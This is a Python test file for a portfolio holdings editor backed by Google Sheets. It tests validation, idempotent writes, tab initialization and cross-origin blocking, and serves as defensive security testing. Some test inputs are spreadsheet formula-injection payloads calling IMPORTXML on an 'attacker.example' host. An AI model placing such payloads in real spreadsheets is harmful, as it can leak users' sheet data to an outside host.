"""Holdings editor regressions; all Google calls use synthetic SDK responses."""
from datetime import date
from decimal import Decimal
from unittest.mock import MagicMock
from copy import deepcopy

import pytest
from pydantic import ValidationError

from app.schema.holdings_schema import HoldingInput
from app.modules.portfolio.sheets import HEADERS, SheetsClient, TABS
from app.modules.portfolio import holdings_manager, portfolio_manager


def holding_input(**changes):
    return HoldingInput(**{
        "position_id": "position-one", "ticker": "NASDAQ:AAPL", "label": "Apple",
        "currency": "USD", "quantity": "1.123456789012", "avg_cost": "150.125",
        **changes,
    })


def test_holding_input_keeps_decimal_quantity_and_optional_unknown_cost():
    body = holding_input(avg_cost=None)
    assert body.quantity == Decimal("1.123456789012")
    assert body.avg_cost is None


@pytest.mark.parametrize("changes", [
    {"ticker": '=IMPORTXML("https://attacker.example","//x")'},
    {"ticker": 'NASDAQ:AAPL"),IMPORTXML("https://attacker.example")'},
    {"ticker": "AAPL"},
    {"position_id": "=1+1"},
    {"currency": '=1'},
    {"quantity": "NaN"}, {"quantity": "Infinity"}, {"quantity": "-1"},
    {"quantity": "0.1234567890123"}, {"avg_cost": "-1"},
    {"quote_mode": "manual", "manual_price": None, "price_as_of": "2026-01-01"},
    {"quote_mode": "manual", "manual_price": "12.5"},
    {"last_price": "0"},
])
def test_holding_input_rejects_injection_invalid_amounts_and_unproven_prices(changes):
    with pytest.raises(ValidationError):
        holding_input(**changes)


def test_manual_price_supports_unqualified_unsupported_ticker_without_zero_default():
    body = holding_input(ticker="UNSUPPORTED", quote_mode="manual", manual_price="7.125",
                         price_as_of=date(2026, 1, 1))
    assert body.manual_price == Decimal("7.125")
    assert body.price_as_of == date(2026, 1, 1)


def test_legacy_sheets_endpoints_retired_and_local_crud_available(client):
    assert client.put("/api/finance/settings", json={"spreadsheet_id": "private-test-sheet"}).status_code == 410
    assert client.post("/api/finance/sync").status_code == 410
    body = {"symbol": "AAPL", "name": "Apple", "currency": "USD", "quantity": "1"}
    created = client.post("/api/data/holdings", json=body)
    assert created.status_code == 201
    assert client.put(f"/api/data/holdings/{created.json()['id']}", json=body).status_code == 200
    assert client.delete(f"/api/data/holdings/{created.json()['id']}").status_code == 204


def writer():
    gateway = SheetsClient.__new__(SheetsClient)
    gateway.service = MagicMock()
    gateway.layout = MagicMock(return_value={tab: i for i, tab in enumerate((*TABS, "Verification"))})
    return gateway


def test_sdk_writer_uses_literal_cells_for_user_data_and_only_server_generated_formulas():
    gateway = writer()
    gateway.read = MagicMock(return_value=[[HEADERS["Holdings"]]])
    gateway.upsert_holding("test-sheet", holding_input(label='=IMPORTXML("https://attacker.example","//x")'))
    call = gateway.service.spreadsheets.return_value.batchUpdate.call_args
    updates = call.kwargs["body"]["requests"]
    assert len(updates) == 1
    cells = updates[0]["updateCells"]
    assert cells["start"]["rowIndex"] == 1
    values = [cell["userEnteredValue"] for cell in cells["rows"][0]["values"]]
    assert values[1] == {"stringValue": '=IMPORTXML("https://attacker.example","//x")'}
    assert values[4] == {"stringValue": "1.123456789012"}
    assert values[5] == {"stringValue": "150.125"}
    assert values[7] == {"formulaValue": '=GOOGLEFINANCE("NASDAQ:AAPL","price")'}
    assert "tradetime" in values[8]["formulaValue"]
    assert [i for i, cell in enumerate(values) if "formulaValue" in cell] == [7, 8]


def test_manual_holding_does_not_write_formulas_or_default_unknown_cost_to_zero():
    gateway = writer()
    gateway.read = MagicMock(return_value=[[HEADERS["Holdings"]]])
    gateway.upsert_holding("test-sheet", holding_input(ticker="UNSUPPORTED", quote_mode="manual",
                          manual_price="12.125", price_as_of=date(2026, 1, 1), avg_cost=None))
    cells = gateway.service.spreadsheets.return_value.batchUpdate.call_args.kwargs["body"]["requests"][0]["updateCells"]["rows"][0]["values"]
    assert all("formulaValue" not in cell["userEnteredValue"] for cell in cells)
    assert cells[5]["userEnteredValue"] == {"stringValue": ""}
    assert cells[7]["userEnteredValue"] == {"stringValue": "12.125"}


def test_ambiguous_write_retry_updates_same_position_without_append_duplicate():
    gateway = writer()
    raw = [HEADERS["Holdings"]]
    gateway.read = MagicMock(side_effect=lambda *args: [[list(row) for row in raw]])
    batch = gateway.service.spreadsheets.return_value.batchUpdate
    attempts = []

    def record(**kwargs):
        request = kwargs["body"]["requests"][0]["updateCells"]
        attempts.append(request["start"]["rowIndex"])
        values = [next(iter(c["userEnteredValue"].values())) for c in request["rows"][0]["values"]]
        row_index = request["start"]["rowIndex"]
        if row_index == len(raw):
            raw.append(values)
        else:
            raw[row_index] = values
        # Simulate server accepting the row but the client losing the response.
        response = MagicMock()
        response.execute.side_effect = TimeoutError("response lost")
        return response

    batch.side_effect = record
    with pytest.raises(TimeoutError):
        gateway.upsert_holding("test-sheet", holding_input())
    gateway.upsert_holding("test-sheet", holding_input())
    assert attempts == [1]
    assert len(raw) == 2
    assert raw[1][0] == "position-one"


def test_duplicate_position_ids_fail_before_any_write():
    gateway = writer()
    gateway.read = MagicMock(return_value=[[HEADERS["Holdings"], ["position-one"], ["position-one"]]])
    with pytest.raises(ValueError, match="Duplicate"):
        gateway.upsert_holding("test-sheet", holding_input())
    gateway.service.spreadsheets.return_value.batchUpdate.assert_not_called()


def test_edit_requires_original_row_version_and_updates_same_sheet_row():
    from app.modules.portfolio.sheets import holding_version

    gateway = writer()
    row = ["position-one", "Original", "NASDAQ:AAPL", "USD", "2", "100", "equity",
           '=GOOGLEFINANCE("NASDAQ:AAPL","price")', "2026-01-01", "googlefinance", "2026-01-01"]
    gateway.read = MagicMock(return_value=[[HEADERS["Holdings"], row]])
    with pytest.raises(ValueError, match="reload"):
        gateway.upsert_holding("test-sheet", holding_input())
    gateway.service.spreadsheets.return_value.batchUpdate.assert_not_called()
    version = holding_version(dict(zip(HEADERS["Holdings"], row)))
    gateway.upsert_holding("test-sheet", holding_input(expected_version=version))
    update = gateway.service.spreadsheets.return_value.batchUpdate.call_args.kwargs["body"]["requests"][0]["updateCells"]
    assert update["start"]["rowIndex"] == 1


def test_initialize_preserves_existing_nonempty_tabs_and_verification():
    gateway = writer()
    gateway.read = MagicMock(side_effect=lambda sheet, ranges, *args: [[
        HEADERS[ranges[0].split("'")[1]] if "Verification" not in ranges[0] else ["existing-quote", "existing-fx"],
        ["existing-data"],
    ]])
    gateway.initialize("test-sheet")
    gateway.service.spreadsheets.return_value.batchUpdate.assert_not_called()


def test_initialize_incompatible_headers_cannot_clobber_or_create_tabs():
    gateway = writer()
    gateway.layout.return_value = {"Cash": 1}
    gateway.read = MagicMock(return_value=[[["my", "private", "data"]]])
    with pytest.raises(ValueError, match="preserved"):
        gateway.initialize("test-sheet")
    gateway.service.spreadsheets.return_value.batchUpdate.assert_not_called()


def test_initialize_creates_only_missing_tabs_and_their_headers():
    gateway = writer()
    full_layout = gateway.layout.return_value
    gateway.layout.side_effect = [{"Cash": full_layout["Cash"]}, full_layout]
    gateway.read = MagicMock(side_effect=lambda sheet, ranges, *args:
                             [[HEADERS["Cash"], ["private-cash"]]] if "'Cash'" in ranges[0] else [[]])
    gateway.initialize("test-sheet")
    requests = [request for call in gateway.service.spreadsheets.return_value.batchUpdate.call_args_list
                for request in call.kwargs["body"]["requests"]]
    added = [request["addSheet"]["properties"]["title"] for request in requests if "addSheet" in request]
    assert set(added) == set((*TABS, "Verification")) - {"Cash"}
    assert all(request["updateCells"]["start"]["sheetId"] != full_layout["Cash"]
               for request in requests if "updateCells" in request)


def test_current_fx_preserves_historical_evidence_and_never_writes_history_tabs():
    gateway = writer()
    gateway.read = MagicMock(return_value=[[HEADERS["FX"], ["USD", "1300", "2026-01-31", "historical"]]])
    gateway.ensure_current_fx("test-sheet", "USD")
    update = gateway.service.spreadsheets.return_value.batchUpdate.call_args.kwargs["body"]["requests"][0]["updateCells"]
    assert update["start"] == {"sheetId": gateway.layout.return_value["FX"], "rowIndex": 2, "columnIndex": 0}
    cells = [c["userEnteredValue"] for c in update["rows"][0]["values"]]
    assert cells[1] == {"formulaValue": '=GOOGLEFINANCE("CURRENCY:USDKRW")'}
    gateway.service.spreadsheets.return_value.batchUpdate.reset_mock()
    gateway.read.return_value = [[HEADERS["FX"], ["USD", "=GOOGLEFINANCE()", "today", "googlefinance"]]]
    gateway.ensure_current_fx("test-sheet", "USD")
    gateway.ensure_current_fx("test-sheet", "KRW")
    gateway.service.spreadsheets.return_value.batchUpdate.assert_not_called()


def test_write_client_rejects_absent_user_credentials_without_adc_fallback(monkeypatch):
    import google.auth
    import googleapiclient.discovery
    adc = MagicMock()
    build = MagicMock()
    monkeypatch.setattr(google.auth, "default", adc)
    monkeypatch.setattr(googleapiclient.discovery, "build", build)
    with pytest.raises(ValueError, match="authorization"):
        SheetsClient(require_write=True)
    adc.assert_not_called()
    build.assert_not_called()


@pytest.fixture
def holdings_api(client, monkeypatch):
    from app.modules.portfolio import market_data_manager
    fake = MagicMock()
    # Local writes must not depend on or call a Google client.
    factory = MagicMock(side_effect=AssertionError("Unexpected Google call"))
    monkeypatch.setattr(market_data_manager, "QuotesSheet", factory)
    return client, fake, factory


def test_local_save_does_not_send_private_fields_to_google(holdings_api):
    client, _, factory = holdings_api
    response = client.post("/api/finance/holdings", json=holding_input(currency="KRW").model_dump(mode="json"))
    assert response.status_code == 200, response.text
    assert response.json()["saved"] is True
    assert response.json()["quote_status"] == "pending"
    assert response.json()["portfolio"]["lines"][0]["value_krw"] is None
    factory.assert_not_called()


def test_request_id_replay_cannot_overwrite_later_local_edit(holdings_api):
    client, _, factory = holdings_api
    original = holding_input(request_id="request-one").model_dump(mode="json")
    first = client.post("/api/finance/holdings", json=original)
    assert first.status_code == 200, first.text
    row = first.json()["rows"][0]
    later = holding_input(request_id="request-two", quantity="7", expected_version=row["expected_version"]).model_dump(mode="json")
    assert client.post("/api/finance/holdings", json=later).status_code == 200
    replay = client.post("/api/finance/holdings", json=original)
    assert replay.status_code == 200, replay.text
    assert replay.json()["replayed"] is True
    assert Decimal(replay.json()["rows"][0]["quantity"]) == Decimal("7")
    assert client.post("/api/finance/holdings", json={**original,"quantity":"9"}).status_code == 422
    factory.assert_not_called()


def test_quote_refresh_without_connection_preserves_historical_snapshot(holdings_api, session):
    from app.modules.database.model import MonthlySnapshot
    client, _, factory = holdings_api
    evidence = {"immutable_evidence": {"quantity": "2", "price": "100"}}
    old = MonthlySnapshot(month=date(2026,1,1),revision=1,reason="recorded history",payload=evidence)
    session.add(old);session.commit()
    result = client.post("/api/finance/holdings/refresh")
    assert result.status_code == 200, result.text
    assert result.json()["warning"]
    session.refresh(old)
    assert old.payload == evidence
    factory.assert_not_called()


@pytest.mark.parametrize("path,body", [
    ("initialize", None), ("refresh", None), ("", {"position_id": "x"}),
])
@pytest.mark.parametrize("headers", [{"Origin": "https://evil.example"}, {"Sec-Fetch-Site": "cross-site"}])
def test_cross_origin_cannot_trigger_google_sheet_mutations(holdings_api, path, body, headers):
    client, _, factory = holdings_api
    payload = holding_input().model_dump(mode="json") if body is not None else None
    endpoint = "/api/finance/holdings" + (f"/{path}" if path else "")
    response = client.post(endpoint, json=payload, headers=headers)
    assert response.status_code == 403, response.text
    factory.assert_not_called()
